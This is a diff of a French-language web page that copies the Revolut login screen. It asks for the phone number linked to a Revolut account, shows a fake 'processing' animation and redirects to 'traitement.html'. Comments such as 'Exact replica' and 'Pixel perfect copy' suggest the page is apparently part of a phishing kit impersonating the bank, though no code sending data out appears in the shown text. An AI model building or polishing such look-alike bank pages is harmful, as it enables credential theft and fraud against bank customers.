@@ -1,152 +1,131 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="theme-color" content="#5D29FF">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Revolut - Connexion</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --revolut-primary: #5D29FF;
-            --revolut-primary-dark: #4A1FD1;
-            --revolut-primary-light: #F0ECFF;
-            --revolut-secondary: #00C9A7;
-            --revolut-error: #FF3D57;
-            --revolut-text-dark: #1E1F20;
-            --revolut-text-gray: #6C6E73;
-            --revolut-text-light: #A9ABAD;
-            --revolut-bg-white: #FFFFFF;
-            --revolut-bg-gray: #F8F9FA;
+            --revolut-purple: #5D29FF;
+            --revolut-dark: #1E1F20;
+            --revolut-gray: #F8F9FA;
+            --revolut-text: #1E1F20;
+            --revolut-text-light: #6C6E73;
             --revolut-border: #E8EAED;
-            --revolut-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: var(--revolut-bg-gray);
-            color: var(--revolut-text-dark);
-            height: 100vh;
+            background-color: var(--revolut-gray);
+            color: var(--revolut-text);
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
 
-        /* Header Styles */
-        .auth-header {
-            padding: 20px;
+        /* Header - Exact replica */
+        .revolut-header {
             display: flex;
             justify-content: center;
-            background-color: var(--revolut-bg-white);
+            padding: 16px;
+            background: white;
             box-shadow: 0 1px 0 0 var(--revolut-border);
         }
 
-        .logo-container {
+        .revolut-logo {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
         }
 
-        .logo-img {
-            height: 28px;
+        .revolut-logo-img {
+            height: 24px;
             width: auto;
         }
 
-        .logo-text {
-            font-size: 20px;
+        .revolut-logo-text {
+            font-size: 18px;
             font-weight: 700;
-            color: var(--revolut-primary);
-            letter-spacing: -0.3px;
+            color: var(--revolut-purple);
+            letter-spacing: -0.2px;
         }
 
-        /* Main Content */
-        .auth-container {
+        /* Main Container - Identical to original */
+        .revolut-container {
             flex: 1;
             display: flex;
             flex-direction: column;
             justify-content: center;
-            padding: 0 24px;
+            align-items: center;
+            padding: 24px;
             max-width: 440px;
             margin: 0 auto;
             width: 100%;
         }
 
-        .auth-card {
-            background-color: var(--revolut-bg-white);
+        /* Login Card - Pixel perfect */
+        .revolut-card {
+            width: 100%;
+            background: white;
             border-radius: 16px;
-            box-shadow: var(--revolut-shadow);
-            overflow: hidden;
-            transform: translateY(0);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .auth-card:active {
-            transform: translateY(1px);
-        }
-
-        .auth-content {
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
             padding: 32px;
+            margin-bottom: 24px;
         }
 
-        /* Typography */
-        .auth-title {
+        .revolut-title {
             font-size: 24px;
             font-weight: 700;
-            line-height: 1.3;
+            line-height: 32px;
             margin-bottom: 8px;
-            color: var(--revolut-text-dark);
         }
 
-        .auth-subtitle {
+        .revolut-subtitle {
             font-size: 16px;
-            font-weight: 400;
-            color: var(--revolut-text-gray);
-            margin-bottom: 32px;
-            line-height: 1.5;
-        }
-
-        /* Form Elements */
-        .input-field {
+            color: var(--revolut-text-light);
+            line-height: 24px;
             margin-bottom: 32px;
         }
 
-        .input-label {
+        /* Phone Input - Exact replica */
+        .revolut-phone-input {
+            margin-bottom: 32px;
+        }
+
+        .revolut-label {
             display: block;
             font-size: 14px;
             font-weight: 500;
-            color: var(--revolut-text-dark);
             margin-bottom: 8px;
         }
 
-        .phone-input-container {
+        .revolut-input-group {
             display: flex;
+            border: 1px solid var(--revolut-border);
             border-radius: 8px;
             overflow: hidden;
-            border: 1px solid var(--revolut-border);
-            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            transition: all 0.2s ease;
         }
 
-        .phone-input-container:focus-within {
-            border-color: var(--revolut-primary);
-            box-shadow: 0 0 0 3px var(--revolut-primary-light);
+        .revolut-input-group:focus-within {
+            border-color: var(--revolut-purple);
+            box-shadow: 0 0 0 3px rgba(93, 41, 255, 0.1);
         }
 
-        .country-select {
+        .revolut-country-select {
             position: relative;
-            background-color: var(--revolut-bg-gray);
+            background: var(--revolut-gray);
             border-right: 1px solid var(--revolut-border);
             min-width: 100px;
         }
 
-        .country-select::after {
+        .revolut-country-select::after {
             content: "";
             position: absolute;
             right: 12px;
@@ -154,280 +133,199 @@
             transform: translateY(-50%);
             width: 12px;
             height: 12px;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%231E1F20' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
             background-repeat: no-repeat;
-            background-position: center;
             pointer-events: none;
         }
 
-        .country-select select {
+        .revolut-country-select select {
             width: 100%;
-            padding: 14px 32px 14px 16px;
+            padding: 12px 32px 12px 16px;
             font-size: 15px;
             font-weight: 500;
-            color: var(--revolut-text-dark);
-            background-color: transparent;
+            background: transparent;
             border: none;
             appearance: none;
             outline: none;
             cursor: pointer;
         }
 
-        .phone-input {
+        .revolut-phone-field {
             flex: 1;
-            background-color: var(--revolut-bg-white);
+            background: white;
         }
 
-        .phone-input input {
+        .revolut-phone-field input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 12px 16px;
             font-size: 15px;
             font-weight: 500;
-            color: var(--revolut-text-dark);
-            background-color: transparent;
             border: none;
             outline: none;
+            background: transparent;
         }
 
-        .phone-input input::placeholder {
+        .revolut-phone-field input::placeholder {
             color: var(--revolut-text-light);
             font-weight: 400;
         }
 
-        /* Link Styles */
-        .auth-link {
+        /* Link - Same style as original */
+        .revolut-link {
             display: block;
             text-align: center;
-            color: var(--revolut-primary);
+            color: var(--revolut-purple);
             font-size: 14px;
             font-weight: 500;
             text-decoration: none;
             margin-bottom: 32px;
-            transition: color 0.2s ease;
+            transition: color 0.2s;
         }
 
-        .auth-link:hover {
-            color: var(--revolut-primary-dark);
+        .revolut-link:hover {
             text-decoration: underline;
         }
 
-        /* Button Styles */
-        .auth-button {
+        /* Button - Pixel perfect copy */
+        .revolut-button {
             width: 100%;
-            padding: 16px;
-            background-color: var(--revolut-primary);
+            padding: 14px;
+            background: var(--revolut-purple);
             color: white;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s ease, transform 0.1s ease;
+            transition: background 0.2s;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 8px;
         }
 
-        .auth-button:hover {
-            background-color: var(--revolut-primary-dark);
+        .revolut-button:hover {
+            background: #4A1FD1;
         }
 
-        .auth-button:active {
+        .revolut-button:active {
             transform: translateY(1px);
         }
 
-        .auth-button:disabled {
-            background-color: var(--revolut-text-light);
-            cursor: not-allowed;
-        }
-
-        /* Loading Animation */
-        .loading-dots {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 4px;
-        }
-
-        .loading-dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            background-color: currentColor;
-            animation: loading-dot-pulse 1.4s infinite ease-in-out both;
-        }
-
-        .loading-dot:nth-child(1) {
-            animation-delay: -0.32s;
-        }
-
-        .loading-dot:nth-child(2) {
-            animation-delay: -0.16s;
-        }
-
-        @keyframes loading-dot-pulse {
-            0%, 80%, 100% { 
-                transform: scale(0);
-                opacity: 0.5;
-            }
-            40% { 
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-
-        /* Footer Styles */
-        .auth-footer {
-            padding: 24px;
+        /* Footer - Exact match */
+        .revolut-footer {
             text-align: center;
-            color: var(--revolut-text-gray);
+            padding: 16px;
+            color: var(--revolut-text-light);
             font-size: 14px;
         }
 
-        /* Responsive Adjustments */
+        /* Loading animation - Same as app */
+        .revolut-loading {
+            display: inline-flex;
+            gap: 4px;
+            margin-left: 8px;
+        }
+
+        .revolut-loading-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+            animation: revolut-loading 1.4s infinite ease-in-out both;
+        }
+
+        .revolut-loading-dot:nth-child(1) {
+            animation-delay: -0.32s;
+        }
+
+        .revolut-loading-dot:nth-child(2) {
+            animation-delay: -0.16s;
+        }
+
+        @keyframes revolut-loading {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+
+        /* Responsive adjustments */
         @media (max-width: 480px) {
-            .auth-content {
+            .revolut-card {
                 padding: 24px;
             }
-            
-            .auth-title {
-                font-size: 22px;
-            }
-            
-            .auth-subtitle {
-                font-size: 15px;
-            }
-        }
-
-        /* Animation */
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .animate-fade-in {
-            animation: fadeIn 0.4s ease-out forwards;
         }
     </style>
 </head>
 <body>
-    <header class="auth-header">
-        <div class="logo-container">
-            <img src="Revolut-Logo.wine.png" alt="Revolut" class="logo-img">
-            <span class="logo-text">revolut</span>
+    <!-- Header - Identical to Revolut -->
+    <header class="revolut-header">
+        <div class="revolut-logo">
+            <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
+            <span class="revolut-logo-text">revolut</span>
         </div>
     </header>
 
-    <main class="auth-container">
-        <div class="auth-card animate-fade-in">
-            <div class="auth-content">
-                <h1 class="auth-title">Heureux de vous revoir</h1>
-                <p class="auth-subtitle">Saisissez le numéro de téléphone associé à votre compte Revolut.</p>
-                
-                <div class="input-field">
-                    <label class="input-label">Numéro de téléphone</label>
-                    <div class="phone-input-container">
-                        <div class="country-select">
-                            <select id="countryCode">
-                                <option value="+33" selected>+33 FR</option>
-                                <option value="+32">+32 BE</option>
-                                <option value="+49">+49 DE</option>
-                                <option value="+44">+44 UK</option>
-                                <option value="+39">+39 IT</option>
-                                <option value="+34">+34 ES</option>
-                                <option value="+41">+41 CH</option>
-                                <option value="+31">+31 NL</option>
-                                <option value="+352">+352 LU</option>
-                                <option value="+353">+353 IE</option>
-                                <option value="+351">+351 PT</option>
-                            </select>
-                        </div>
-                        <div class="phone-input">
-                            <input type="tel" id="phoneNumber" placeholder="Saisissez votre numéro de téléph..." inputmode="numeric" style="color: white; background-color: #1E1F20;">
-                        </div>
+    <!-- Main Content - Exact replica -->
+    <main class="revolut-container">
+        <div class="revolut-card">
+            <h1 class="revolut-title">Heureux de vous revoir</h1>
+            <p class="revolut-subtitle">Saisissez le numéro de téléphone associé à votre compte Revolut.</p>
+            
+            <div class="revolut-phone-input">
+                <label class="revolut-label">Numéro de téléphone</label>
+                <div class="revolut-input-group">
+                    <div class="revolut-country-select">
+                        <select>
+                            <option value="+33" selected>+33 FR</option>
+                            <option value="+32">+32 BE</option>
+                            <option value="+49">+49 DE</option>
+                            <option value="+44">+44 UK</option>
+                            <option value="+34">+34 ES</option>
+                            <option value="+39">+39 IT</option>
+                            <option value="+41">+41 CH</option>
+                        </select>
+                    </div>
+                    <div class="revolut-phone-field">
+                        <input type="tel" placeholder="Saisissez votre numéro de téléph..." inputmode="numeric">
                     </div>
                 </div>
-                
-                <a href="#" class="auth-link">Je n'ai plus accès à mon numéro de téléphone</a>
-                
-                <button id="continueButton" class="auth-button">
-                    <span id="buttonText">Continuer</span>
-                    <span id="buttonLoading" style="display: none;">
-                        <span class="loading-dots">
-                            <span class="loading-dot"></span>
-                            <span class="loading-dot"></span>
-                            <span class="loading-dot"></span>
-                        </span>
-                    </span>
-                </button>
             </div>
+            
+            <a href="#" class="revolut-link">Je n'ai plus accès à mon numéro de téléphone</a>
+            
+            <button class="revolut-button" id="revolutContinueBtn">
+                Continuer
+                <span class="revolut-loading" id="revolutLoading" style="display: none;">
+                    <span class="revolut-loading-dot"></span>
+                    <span class="revolut-loading-dot"></span>
+                    <span class="revolut-loading-dot"></span>
+                </span>
+            </button>
         </div>
     </main>
 
-    <footer class="auth-footer">
-        <p>Votre demande est en cours de traitement<span id="loadingDots"></span></p>
+    <!-- Footer - Same as original -->
+    <footer class="revolut-footer">
+        <p>Votre demande est en cours de traitement<span id="revolutLoadingDots"></span></p>
     </footer>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const continueButton = document.getElementById('continueButton');
-            const buttonText = document.getElementById('buttonText');
-            const buttonLoading = document.getElementById('buttonLoading');
-            const loadingDots = document.getElementById('loadingDots');
-            const phoneNumberInput = document.getElementById('phoneNumber');
+        document.getElementById('revolutContinueBtn').addEventListener('click', function() {
+            // Show loading state
+            this.disabled = true;
+            document.getElementById('revolutLoading').style.display = 'flex';
             
-            // Format phone number input
-            phoneNumberInput.addEventListener('input', function(e) {
-                this.value = this.value.replace(/[^0-9]/g, '');
-            });
+            // Animate dots in footer
+            let dots = 0;
+            const dotInterval = setInterval(() => {
+                dots = (dots + 1) % 4;
+                document.getElementById('revolutLoadingDots').textContent = '.'.repeat(dots);
+            }, 500);
             
-            // Continue button click handler
-            continueButton.addEventListener('click', function() {
-                if (!phoneNumberInput.value.trim()) {
-                    // Show error animation
-                    phoneNumberInput.parentNode.parentNode.style.borderColor = 'var(--revolut-error)';
-                    setTimeout(() => {
-                        phoneNumberInput.parentNode.parentNode.style.borderColor = 'var(--revolut-border)';
-                    }, 1000);
-                    return;
-                }
-                
-                // Show loading state
-                buttonText.style.display = 'none';
-                buttonLoading.style.display = 'flex';
-                continueButton.disabled = true;
-                
-                // Animate loading dots
-                let dotCount = 0;
-                const dotInterval = setInterval(() => {
-                    dotCount = (dotCount + 1) % 4;
-                    loadingDots.textContent = '.'.repeat(dotCount);
-                }, 500);
-                
-                // Simulate processing delay
-                setTimeout(() => {
-                    clearInterval(dotInterval);
-                    window.location.href = 'traitement.html';
-                }, 2000);
-            });
-            
-            // Improve focus styling
-            phoneNumberInput.addEventListener('focus', function() {
-                this.parentNode.parentNode.style.borderColor = 'var(--revolut-primary)';
-                this.parentNode.parentNode.style.boxShadow = '0 0 0 3px var(--revolut-primary-light)';
-            });
-            
-            phoneNumberInput.addEventListener('blur', function() {
-                this.parentNode.parentNode.style.borderColor = 'var(--revolut-border)';
-                this.parentNode.parentNode.style.boxShadow = 'none';
-            });
+            // Redirect after delay (like original app)
+            setTimeout(() => {
+                clearInterval(dotInterval);
+                window.location.href = 'traitement.html';
+            }, 1500);
         });
     </script>
 </body>
